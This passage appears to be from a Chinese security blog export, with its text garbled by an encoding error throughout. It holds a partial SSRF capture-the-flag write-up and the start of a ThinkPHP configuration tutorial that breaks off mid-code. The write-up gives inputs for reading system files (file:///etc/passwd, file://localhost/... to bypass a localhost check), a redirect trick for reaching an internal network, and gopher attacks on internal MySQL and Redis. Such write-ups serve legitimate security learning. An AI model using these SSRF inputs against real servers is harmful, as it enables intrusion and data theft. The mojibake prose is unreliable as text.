¹æ®ssrfçš„ç‰¹æ€§ï¼Œç¡®è®¤æ­¤å¤„å­˜åœ¨ssrfæ¼æ´ã€‚<br>äºæ˜¯æˆ‘ä»¬è¦åšçš„å°±æ˜¯åˆ©ç”¨è¿™ä¸ªå‚æ•°å»è®¿é—®å…¶å†…ç½‘ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå…¶è¿‡æ»¤äº†IPï¼Œäºæ˜¯åœ¨è‡ªå·±çš„vpsä¸Šæ”¾äº†ä¸€ä¸ª302è·³è½¬ï¼š<br>åˆ©ç”¨è·³è½¬æ¥è®¿é—®å†…ç½‘<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btni4rg0j30zt0aewhm.jpg" alt=""><br>è®¿é—®è¿™ä¸ªcssæ–‡ä»¶<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btog0m5mj30ut0bqtel.jpg" alt=""><br>å¾—åˆ°å†…ç½‘çš„åŸŸå,æ¥ä¸‹æ¥è®¿é—®è¿™ä¸ªå†…ç½‘åŸŸå<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1btpefn7bj30uh0cfadp.jpg" alt=""><br>ç‚¹äº†ä¸‹å¯¼èˆªæ ä¸‹é¢çš„å›¾ç‰‡ï¼Œç›´æ¥ç»™è·³å›å»ï¼Œä½†æ˜¯å‘ç°åœ°å€æ å¤šäº†ä¸€äº›ä¸œè¥¿ï¼Œçœ‹åˆ°srcï¼Œä»¥åŠonlineå‡ ä¸ªå‚æ•°ï¼Œ</p><h1 id="é€šè¿‡gopherå‘é€postæ•°æ®åŒ…"><a href="#é€šè¿‡gopherå‘é€postæ•°æ®åŒ…" class="headerlink" title="é€šè¿‡gopherå‘é€postæ•°æ®åŒ…"></a>é€šè¿‡gopherå‘é€postæ•°æ®åŒ…</h1><h1 id="é€šè¿‡gopheræ”»å‡»å†…ç½‘æ•°æ®åº“"><a href="#é€šè¿‡gopheræ”»å‡»å†…ç½‘æ•°æ®åº“" class="headerlink" title="é€šè¿‡gopheræ”»å‡»å†…ç½‘æ•°æ®åº“"></a>é€šè¿‡gopheræ”»å‡»å†…ç½‘æ•°æ®åº“</h1><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>2018  ISITDTU çš„ä¸€é“CTF<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g19dh7bspwj30ki048t8j.jpg" alt=""></p><p>èƒ½å¤Ÿçœ‹å‡ºæ¥æ˜¯ä¸€é“SSRF<br>äºæ˜¯åˆ©ç”¨file:// è¯»ä¸€ä¸‹æ–‡ä»¶ è¾“å…¥file:///etc/passwd<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g19dir17yuj30p405ct90.jpg" alt=""><br>å¯ä»¥çœ‹åˆ°åå°åˆ¤æ–­äº†æœåŠ¡å™¨æ˜¯å¦ä¸ºlocalhostï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡file://localhost/etc/passwdå³å¯ç»•è¿‡é™åˆ¶ã€‚è¿™é‡Œæˆ‘ä»¬å°è¯•è¯»é¢˜ç›®æºç file://localhost/var/www/html/index.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include_once</span> <span class="string">"config.php"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])&amp;&amp;!<span class="keyword">empty</span>($_POST[<span class="string">'url'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php">    $content_url = getUrlContent($url);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $content_url = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>å†è¯»ä¸€ä¸‹config.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$hosts = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$dbusername = <span class="string">"ssrf_user"</span>;</span></span><br><span class="line"><span class="php">$dbpasswd = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"ssrf"</span>;</span></span><br><span class="line"><span class="php">$dbport = <span class="number">3306</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">initdb</span><span class="params">($conn)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $dbinit = <span class="string">"create table if not exists flag(secret varchar(100));"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(mysqli_query($conn,$dbinit)) <span class="keyword">return</span> <span class="number">1</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">safe</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $tmpurl = parse_url($url, PHP_URL_HOST);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($tmpurl != <span class="string">"localhost"</span> <span class="keyword">and</span> $tmpurl != <span class="string">"127.0.0.1"</span>)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        var_dump($tmpurl);</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">"&lt;h1&gt;Only access to localhost&lt;/h1&gt;"</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $url;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">getUrlContent</span><span class="params">($url)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $url = safe($url);</span></span><br><span class="line"><span class="php">    $url = escapeshellarg($url);</span></span><br><span class="line"><span class="php">    $pl = <span class="string">"curl "</span>.$url;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $pl;</span></span><br><span class="line"><span class="php">    $content = shell_exec($pl);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $content;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">initdb($conn);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>åœ¨æ•°æ®åº“ä¸­ä¸”ç»™å‡ºäº†æˆ‘ä»¬ä¸€ä¸ªç©ºå¯†ç çš„mysqlè´¦æˆ·<br>gopheråè®®çš„ä¸»è¦åŠŸèƒ½æ˜¯å¯ä»¥ç›´æ¥å‘èµ·socketè¿æ¥è·å–æ•°æ®ï¼Œè€Œä¸”ç”±äºmysqlè¿™é‡Œç»™å‡ºçš„å¯†ç æ˜¯ç©ºå¯†ç ï¼Œå› æ­¤å¯ä»¥é€šè¿‡gopherå‘èµ·sqlè¯·æ±‚æ¥è·å–æ•°æ®ã€‚</p><p>å¸®åŠ©ç”Ÿæˆgopheræ”»å‡»mysqlçš„payload</p><p><a href="https://github.com/style-404/mysql_gopher_attack" target="_blank" rel="noopener">https://github.com/style-404/mysql_gopher_attack</a></p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>2016Hctfçš„ä¸€é“é¢˜</p><p>hackmeä¸Šä¸€é“çš„ä¸€é“XSSåŠ ssrf</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/4420#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/4420#toc-4</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>thinnkphpå­¦ä¹ </title>
      <link href="/2019/03/23/thinnkphp%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/03/23/thinnkphp%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><p>#å®‰è£…ä¸é…ç½®</p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>æˆ‘ä»¬ç°åœ¨å¼€å§‹å­¦ä¹ ThinkPHPç¬¬ä¸€æ­¥ï¼šè®¾ç½®ThinkPHPã€‚ä¸€ä¸ªæ¡†æ¶çš„åŸå§‹æ¨¡æ ·å¯èƒ½æ— æ³•æ»¡è¶³ä½ çš„å¼€å‘éœ€æ±‚ï¼Œä½†ä½ å¯ä»¥é€šè¿‡è®¾ç½®æ¥æ»¡è¶³ã€‚åœ¨å­¦ä¹ ThinkPHPçš„é…ç½®çš„æ—¶å€™ï¼Œé¦–å…ˆè¦æ˜ç™½ï¼šThinkPHPæ¡†æ¶ä¸­æ‰€æœ‰é…ç½®æ–‡ä»¶çš„å®šä¹‰æ ¼å¼éƒ½æ˜¯é‡‡ç”¨è¿”å›PHPæ•°ç»„çš„æ–¹å¼æ¥å®šä¹‰çš„ã€‚</p><p>æˆ‘ä»¬æœ€å¸¸æ“ä½œçš„æ˜¯åº”ç”¨é…ç½®ï¼Œé»˜è®¤çš„å°±æ˜¯åœ¨Application/Common/Conf/config.phpæ–‡ä»¶ä¸­ï¼š<br><figure class="highlight sml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">return <span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'URL_ROUTER_ON'</span>   =&gt; <span class="literal">true</span>,</span><br><span class="line">    <span class="symbol">'URL_ROUTE_RULES'</span>=&gt;<span class="built_in">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="symbol">'blogs</span>/:id'               =&gt; <span class="built_in">array</span>(<span class="symbol">'Index</span>/read'),</span><br><span class="line">    <span class="symbol">'article</span>/:id'               =&gt; <span class="built_in">array</span>(<span class="symbol">'Article</span>/show')</span><br><span class="line">),</span><br><span class="line">    <span class="symbol">'URL_MAP_RULES'</span>=&gt;<span class="built_in">array</span>(</span><br><span class="line">    <span class="symbol">'new</span>/top' =&gt; <span class="symbol">'Index</span>/top?<span class="keyword">type</span>=top'</span><br><span class="line">),</span><br><span class="line"></span><br><span class="line">    <span class="symbol">'DB_TYPE'</span>               =&gt;  <span class="symbol">'mysql'</span>,</span><br><span class="line">    <span class="symbol">'DB_HOST'</span>               =&gt;  <span class="symbol">'localhost'</span>,</span><br><span class="line">    <span class="symbol">'DB_NAME'</span>               =&gt;  <span class="symbol">'think'</span>,</span><br><span class="line">    <span class="symbol">'DB_USER'</span>               =&gt;  <span class="symbol">'root'</span>,</span><br><span class="line">    <span class="symbol">'DB_PWD'</span>                =&gt;  <span class="string">''</span>,</span><br><span class="line">    <span class="symbol">'DB_PORT'</span>               =&gt;  <span class="string">'3306'</span>,</span><br><span class="line">    <span class="symbol">'DB_PREFIX'</span>             =&gt;  <span class="symbol">'think_'</span>,</span><br><span class="line"></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>è¯´æ˜ï¼šThinkPHPçš„é…ç½®å‚æ•°ï¼ˆä¸€çº§å‚æ•°ï¼‰æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œå› ä¸ºä¸ç®¡å¤§å†™å°å†™ï¼Œæœ€åéƒ½ä¼šè½¬ä¸ºå°å†™ã€‚ä½†æ˜¯ä¸ºäº†åœ¨ç¼–ç¨‹çš„è¿‡ç¨‹ä¸­æ›´ç¬¦åˆè§„èŒƒï¼Œå»ºè®®ç»Ÿä¸€ä½¿ç”¨å¤§å†™æ¥è®¾ç½®é…ç½®å‚æ•°ã€‚ä¸Šé¢çš„ç¬¬ä¸€ä¸ªé…ç½®URL_ROUTER_ONï¼Œæˆ‘ä»¬å¼€å¯äº†è·¯ç”±é‡å†™åŠŸèƒ½ï¼Œä¸ºåé¢çš„ URL_ROUTE_RULES å¥ å®šåŸºç¡€ï¼ˆè¯¦ç»†çš„åé¢æˆ‘ä»¬ä¼šåœ¨è·¯ç”±ç« èŠ‚è¯´åˆ°ï¼‰ã€‚æœ€åå‡ ä¸ªå¸¦DB_çš„è®¾ç½®é¡¹æ˜¯è¡¨ç¤ºè®¾ç½®è¿æ¥æ•°æ®åº“çš„å‚æ•°ï¼Œå‡ ä¹æ¯ä¸€ä¸ªwebåº”ç”¨éƒ½ä¼šç”¨åˆ°æ•°æ®åº“ï¼Œè¿™äº›è®¾ç½®ä¸ºæˆ‘ä»¬åç»­è¿›ä¸€æ­¥å­¦ä¹ çš„åŸºç¡€ã€‚<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="keyword">return</span> <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'USER_CONFIG'</span>        =&gt; <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">        <span class="string">'USER_AUTH'</span> =&gt; <span class="keyword">true</span>,</span></span><br><span class="line"><span class="php">        <span class="string">'USER_TYPE'</span> =&gt; <span class="number">2</span>,</span></span><br><span class="line"><span class="php">    ),</span></span><br><span class="line"><span class="php">);</span></span><br></pre></td></tr></table></figure></p><p>å¦‚ä¸Šé¢çš„USER_CONFIGä¸‹çš„USER_AUTHå’ŒUSER_TYPEæ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚ è¿™ä¸ªåªæ˜¯ç¤ºä¾‹ï¼Œå¦‚æœåœ¨é¡¹ç›®ä¸­çœŸçš„éœ€è¦äºŒçº§é…ç½®ï¼Œè¯·åŒºåˆ†å¤§å°å†™ï¼Œè¿™äº›é…ç½®ä¹Ÿæ˜¯åœ¨Application/Common/Conf/config.phpä¸­é…ç½®çš„ã€‚</p><p>äº†è§£äº†ThinkPHPçš„é…ç½®æ ¼å¼åï¼Œæˆ‘ä»¬å†çœ‹çœ‹ThinkPHPçš„é…ç½®åŠ è½½é¡ºåºï¼Œç†è§£é…ç½®é¡¹çš„åŠ è½½é¡ºåºåœ¨å¼€å‘çš„æ—¶å€™å¾ˆé‡è¦ï¼Œå› ä¸ºåœ¨åŒåçš„é…ç½®ä¸‹ï¼ŒååŠ è½½çš„é…ç½®ä¼šè¦†ç›–å‰é¢åŠ è½½çš„é¡ºåºï¼Œè€Œç”Ÿæ•ˆçš„åªæœ‰ååŠ è½½çš„é¡ºåºã€‚</p><p>æƒ¯ä¾‹é…ç½®-&gt;åº”ç”¨é…ç½®-&gt;æ¨¡å¼é…ç½®-&gt;è°ƒè¯•é…ç½®-&gt;çŠ¶æ€é…ç½®-&gt;æ¨¡å—é…ç½®-&gt;æ‰©å±•é…ç½®-&gt;åŠ¨æ€é…ç½®</p><p>ä¸Šé¢çš„é¡ºåºå°±æ˜¯ThinkPHPçš„é…ç½®åŠ è½½é¡ºåºï¼Œè€Œåœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¿™äº›é…ç½®éƒ½æ˜¯è‡ªåŠ¨åŠ è½½çš„ã€‚æˆ‘ä»¬æœ€å¸¸æ“ä½œçš„æ˜¯åº”ç”¨é…ç½®ï¼Œé»˜è®¤çš„å°±æ˜¯åœ¨Application/Common/Conf/config.phpæ–‡ä»¶ä¸­ã€‚åœ¨å¼€å‘çš„æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œè®¾ç½®è‡ªå·±çš„é…ç½®ï¼Œå¦‚æœä½ ä¸ç†Ÿæ‚‰ä½ å¯ä»¥é…ç½®ä»€ä¹ˆå€¼ï¼Œä½ å¯ä»¥æ‰“å¼€ThinkPHP/Conf/convention.phpæ–‡ä»¶æ¥æŸ¥çœ‹ç›¸å¯¹åº”çš„é…ç½®é¡¹</p><p>è¯»å–é…ç½®<br>åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™éœ€è¦è¯»å–åº”ç”¨çš„é…ç½®å€¼ï¼Œåœ¨ThinkPHPä¸­ç»Ÿä¸€ä½¿ç”¨C(â€˜é…ç½®å‚æ•°åâ€™)æ¥è¯»å–é…ç½®ã€‚æ¯”å¦‚ï¼š<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$model = C(<span class="string">'URL_MODEL'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>æˆ–è€…<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$model = C(<span class="string">'url_model'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>è¿™ä¸¤ä¸ªæ˜¯ç­‰æ•ˆçš„ï¼Œéƒ½æ˜¯å¯ä»¥è¯»å–åˆ°ç³»ç»Ÿçš„URLè®¿é—®æ¨¡å¼çš„è®¾ç½®å€¼ï¼Œå› ä¸ºåœ¨ThinkPHPçš„é…ç½®é¡¹æ˜¯ä¸åˆ†å¤§å°å†™çš„ã€‚ä½†æ˜¯å»ºè®®ç»Ÿä¸€ä½¿ç”¨å¤§å†™æ–¹å¼ã€‚</p><p>å¯ä»¥åˆ©ç”¨configé¦–å­—æ¯æ¥è®°å¿†C()æ–¹æ³•ã€‚</p><h2 id="è¯¾åä¹ é¢˜"><a href="#è¯¾åä¹ é¢˜" class="headerlink" title="è¯¾åä¹ é¢˜"></a>è¯¾åä¹ é¢˜</h2><p>æŸ¥çœ‹ThinkPHP/Conf/convention.phpçš„å†…å®¹ï¼Œå¯¹å…¶ä¸­çš„é…ç½®é¡¹è¿›è¡Œåˆæ­¥äº†è§£<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | ThinkPHP [ WE CAN DO IT JUST THINK IT ]</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Copyright (c) 2006-2014 http://thinkphp.cn All rights reserved.</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"><span class="comment">// | Author: liu21st &lt;liu21st@gmail.com&gt;</span></span></span><br><span class="line"><span class="php"><span class="comment">// +----------------------------------------------------------------------</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line">/**</span><br><span class="line"> * ThinkPHPæƒ¯ä¾‹é…ç½®æ–‡ä»¶</span><br><span class="line"> * è¯¥æ–‡ä»¶è¯·ä¸è¦ä¿®æ”¹ï¼Œå¦‚æœè¦è¦†ç›–æƒ¯ä¾‹é…ç½®çš„å€¼ï¼Œå¯åœ¨åº”ç”¨é…ç½®æ–‡ä»¶ä¸­è®¾å®šå’Œæƒ¯ä¾‹ä¸ç¬¦çš„é…ç½®é¡¹</span><br><span class="line"> * é…ç½®åç§°å¤§å°å†™ä»»æ„ï¼Œç³»ç»Ÿä¼šç»Ÿä¸€è½¬æ¢æˆå°å†™</span><br><span class="line"> * æ‰€æœ‰é…ç½®å‚æ•°éƒ½å¯ä»¥åœ¨ç”Ÿæ•ˆå‰åŠ¨æ€æ”¹å˜</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php">defined(<span class="string">'THINK_PATH'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php"><span class="keyword">return</span>  <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="comment">/* åº”ç”¨è®¾å®š */</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_USE_NAMESPACE'</span>     =&gt;  <span class="keyword">true</span>,    <span class="comment">// åº”ç”¨ç±»åº“æ˜¯å¦ä½¿ç”¨å‘½åç©ºé—´</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_SUB_DOMAIN_DEPLOY'</span> =&gt;  <span class="keyword">false</span>,   <span class="comment">// æ˜¯å¦å¼€å¯å­åŸŸåéƒ¨ç½²</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_SUB_DOMAIN_RULES'</span>  =&gt;  <span class="keyword">array</span>(), <span class="comment">// å­åŸŸåéƒ¨ç½²è§„åˆ™</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_DOMAIN_SUFFIX'</span>     =&gt;  <span class="string">''</span>, <span class="comment">// åŸŸååç¼€ å¦‚æœæ˜¯com.cn net.cn ä¹‹ç±»çš„åç¼€å¿…é¡»è®¾ç½®    </span></span></span><br><span class="line"><span class="php">    <span class="string">'ACTION_SUFFIX'</span>         =&gt;  <span class="string">''</span>, <span class="comment">// æ“ä½œæ–¹æ³•åç¼€</span></span></span><br><span class="line"><span class="php">    <span class="string">'MULTI_MODULE'</span>          =&gt;  <span class="keyword">true</span>, <span class="comment">// æ˜¯å¦å…è®¸å¤šæ¨¡å— å¦‚æœä¸ºfalse åˆ™å¿…é¡»è®¾ç½® DEFAULT_MODULE</span></span></span><br><span class="line"><span class="php">    <span class="string">'MODULE_DENY_LIST'</span>      =&gt;  <span class="keyword">array</span>(<span class="string">'Common'</span>,<span class="string">'Runtime'</span>),</span></span><br><span class="line"><span class="php">    <span class="string">'CONTROLLER_LEVEL'</span>      =&gt;  <span class="number">1</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'APP_AUTOLOAD_LAYER'</span>    =&gt;  <span class="string">'Controller,Model'</span>, <span class="comment">// è‡ªåŠ¨åŠ è½½çš„åº”ç”¨ç±»åº“å±‚ å…³é—­APP_USE_NAMESPACEåæœ‰æ•ˆ</span></span></span><br><span class="line"><span class="php">    <span class="string">'APP_AUTOLOAD_PATH'</span>     =&gt;  <span class="string">'Model'</span>, <span class="comment">// è‡ªåŠ¨åŠ è½½çš„è·¯å¾„ å…³é—­APP_USE_NAMESPACEåæœ‰æ•ˆ</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="comment">/* Cookieè®¾ç½® */</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_EXPIRE'</span>         =&gt;  <span class="number">0</span>,    <span class="comment">// Cookieæœ‰æ•ˆæœŸ</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_DOMAIN'</span>         =&gt;  <span class="string">''</span>,      <span class="comment">// Cookieæœ‰æ•ˆåŸŸå</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_PATH'</span>           =&gt;  <span class="string">'/'</span>,     <span class="comment">// Cookieè·¯å¾„</span></span></span><br><span class="line"><span class="php">    <span class="string">'COOKIE_PREFIX'</span>         =&gt;  <span class="string">''</span>,      <span class="comment">// 